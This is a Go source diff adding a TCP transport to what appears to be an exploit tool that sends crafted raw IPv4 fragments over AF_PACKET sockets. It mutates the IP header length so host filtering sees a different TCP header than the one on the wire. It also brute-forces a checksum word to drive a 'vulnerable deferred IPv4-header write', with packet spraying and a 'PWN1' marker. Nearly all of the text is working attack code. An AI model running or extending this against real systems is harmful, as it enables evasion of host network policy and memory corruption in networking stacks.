@@ -22,6 +22,7 @@ const (
 	soRcvbufForce  = 33
 	ethPAll        = 0x0003
 	ipProtoICMP    = 1
+	ipProtoTCP     = 6
 	ipProtoUDP     = 17
 	ipProtoRaw     = 253
 	mutatedIHL     = 60
@@ -42,6 +43,7 @@ type egressCaptureStats struct {
 	txFragments     int
 	icmpPackets     int
 	quoted253       int
+	quotedTCP       int
 	quotedUDP       int
 	matched         bool
 	matchedPackets  int
@@ -100,9 +102,13 @@ func runEgress(c cfg) error {
 	}
 	fragments := (c.egressRest + maxChunk - 1) / maxChunk
 	proto := byte(ipProtoRaw)
-	if c.transport == "udp" {
+	switch c.transport {
+	case "udp":
 		proto = ipProtoUDP
+	case "tcp":
+		proto = ipProtoTCP
 	}
+	adjustIP := egressAdjustmentIPOffset(c.transport)
 	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head spray=%d fill=0x%02x\n",
 		ifi.Name, ifi.MTU, src, ifi.HardwareAddr, dst, nextHop, nextMAC,
 		routeIPv4(route.dest), route.prefix, c.transport, c.head+c.egressRest, fragments,
@@ -116,21 +122,24 @@ func runEgress(c cfg) error {
 		for i := range payload {
 			payload[i] = 0x11
 		}
-		if c.transport == "udp" {
+		switch c.transport {
+		case "udp":
 			egressUDPHeaders(payload, uint16(c.udpSrcPort), uint16(c.udpPort))
-		} else {
+		case "tcp":
+			egressTCPHeaders(payload, uint16(c.tcpSrcPort), uint16(c.tcpPort))
+		default:
 			for i := 0; i < c.head; i++ {
 				payload[i] = marker
 			}
 		}
-		if !egressSolve(payload, id, src, dst, proto, c.csumOffset, uint16(c.csumWord)) {
+		if !egressSolveAt(payload, id, src, dst, proto, c.csumOffset, uint16(c.csumWord), adjustIP) {
 			return fmt.Errorf("sample %d: solver found no adjustment for checksum word 0x%04x", sample, c.csumWord)
 		}
 		samples = append(samples, egressPrepared{id: id, payload: payload})
 		expected[id] = struct{}{}
 	}
 	for sample, prepared := range samples {
-		if err := egressSendSequence(tx, ifi, ifi.HardwareAddr, nextMAC, src, dst, prepared.id, proto, prepared.payload, c.head, maxChunk, c.csumOffset, c.vlanTags, c.egressSpray, c.egressFill, c.sprayDelay); err != nil {
+		if err := egressSendSequence(tx, ifi, ifi.HardwareAddr, nextMAC, src, dst, prepared.id, proto, prepared.payload, c.head, maxChunk, c.csumOffset, adjustIP, c.vlanTags, c.egressSpray, c.egressFill, c.sprayDelay); err != nil {
 			return fmt.Errorf("sample %d: %w", sample, err)
 		}
 	}
@@ -138,9 +147,9 @@ func runEgress(c cfg) error {
 	if err != nil {
 		return fmt.Errorf("capture: %w", err)
 	}
-	fmt.Printf("capture: samples=%d tx_fragments=%d returned_packets=%d arp_requests=%d arp_replies=%d icmp=%d quoted_udp=%d quoted_proto253=%d matched_packets=%d matched_ids=%d\n",
+	fmt.Printf("capture: samples=%d tx_fragments=%d returned_packets=%d arp_requests=%d arp_replies=%d icmp=%d quoted_tcp=%d quoted_udp=%d quoted_proto253=%d matched_packets=%d matched_ids=%d\n",
 		len(samples), stats.txFragments, stats.returnedPackets, stats.arpRequests, stats.arpReplies,
-		stats.icmpPackets, stats.quotedUDP, stats.quoted253,
+		stats.icmpPackets, stats.quotedTCP, stats.quotedUDP, stats.quoted253,
 		stats.matchedPackets, len(stats.matchedIDs))
 	if !stats.matched {
 		return errors.New("no matching returned fragment or ICMP quotation received; use -answer-dst-arp with an unused host-TAP address or capture at a controlled endpoint")
@@ -162,6 +171,37 @@ func putUDPHeader(dst []byte, srcPort, dstPort, length uint16) {
 	binary.BigEndian.PutUint16(dst[2:4], dstPort)
 	binary.BigEndian.PutUint16(dst[4:6], length)
 	binary.BigEndian.PutUint16(dst[6:8], 0)
+}
+
+func egressTCPHeaders(payload []byte, srcPort, dstPort uint16) {
+	// The first SYN-shaped header is visible to host policy before the IHL
+	// mutation. After IHL grows from 20 to 60, the second header becomes the
+	// transport header observed on the emitted fragments.
+	putTCPHeader(payload[:20], srcPort, dstPort)
+	putTCPHeader(payload[40:60], srcPort, dstPort)
+}
+
+func putTCPHeader(dst []byte, srcPort, dstPort uint16) {
+	clear(dst[:20])
+	binary.BigEndian.PutUint16(dst[0:2], srcPort)
+	binary.BigEndian.PutUint16(dst[2:4], dstPort)
+	binary.BigEndian.PutUint32(dst[4:8], 0x50574e31) // "PWN1"
+	dst[12] = 5 << 4                                 // 20-byte TCP header
+	dst[13] = 0x02                                   // SYN
+	binary.BigEndian.PutUint16(dst[14:16], 64240)
+	// A passive AF_PACKET collector sees the fragments before the remote TCP
+	// stack validates this zero checksum. The malformed checksum is deliberate:
+	// making it valid would constrain the same sum used for the vulnerable
+	// deferred IPv4-header write.
+}
+
+func egressAdjustmentIPOffset(transport string) int {
+	if transport == "tcp" {
+		// Payload bytes 0..19 and 40..59 are the two TCP headers. Payload
+		// bytes 24..25 are outside both, at full IPv4 offsets 44..45.
+		return 44
+	}
+	return 32
 }
 
 func egressSourceIP(ifi *net.Interface, override string) (net.IP, error) {
@@ -333,7 +373,7 @@ func egressPacketSocket(ifindex int, vnet bool) (int, error) {
 	return fd, nil
 }
 
-func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, id uint16, proto byte, payload []byte, head, maxChunk, csumOffset, vlanTags, spray int, sprayFill byte, sprayDelay time.Duration) error {
+func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, id uint16, proto byte, payload []byte, head, maxChunk, csumOffset, adjustIP, vlanTags, spray int, sprayFill byte, sprayDelay time.Duration) error {
 	for offset := head; offset < len(payload); {
 		n := min(maxChunk, len(payload)-offset)
 		more := offset+n < len(payload)
@@ -358,7 +398,9 @@ func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareA
 	if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(first, srcMAC, dstMAC, vlanTags), true, uint16(l2LenForTags(vlanTags)), uint16(csumOffset)); err != nil {
 		return fmt.Errorf("send head fragment: %w", err)
 	}
-	fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment=%02x%02x\n", id, head, len(payload)-head, payload[12], payload[13])
+	adjustPayload := adjustIP - ipLen
+	fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment_ip_offset=%d adjustment=%02x%02x\n",
+		id, head, len(payload)-head, adjustIP, payload[adjustPayload], payload[adjustPayload+1])
 	return nil
 }
 
@@ -394,11 +436,14 @@ func egressSendFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, che
 }
 
 func egressSolve(payload []byte, id uint16, src, dst net.IP, proto byte, csumOffset int, desired uint16) bool {
-	const adjust = 32
-	if adjust+1 >= ipLen+len(payload) {
+	return egressSolveAt(payload, id, src, dst, proto, csumOffset, desired, 32)
+}
+
+func egressSolveAt(payload []byte, id uint16, src, dst net.IP, proto byte, csumOffset int, desired uint16, adjustIP int) bool {
+	if adjustIP < ipLen || adjustIP+1 >= ipLen+len(payload) {
 		return false
 	}
-	off := adjust - ipLen
+	off := adjustIP - ipLen
 	for word := 0; word < 65536; word++ {
 		payload[off] = byte(word)
 		payload[off+1] = byte(word >> 8)
@@ -520,6 +565,8 @@ func egressCollectICMP(fd, txfd int, ifi *net.Interface, wait time.Duration, exp
 		switch quoted[9] {
 		case ipProtoRaw:
 			stats.quoted253++
+		case ipProtoTCP:
+			stats.quotedTCP++
 		case ipProtoUDP:
 			stats.quotedUDP++
 		}
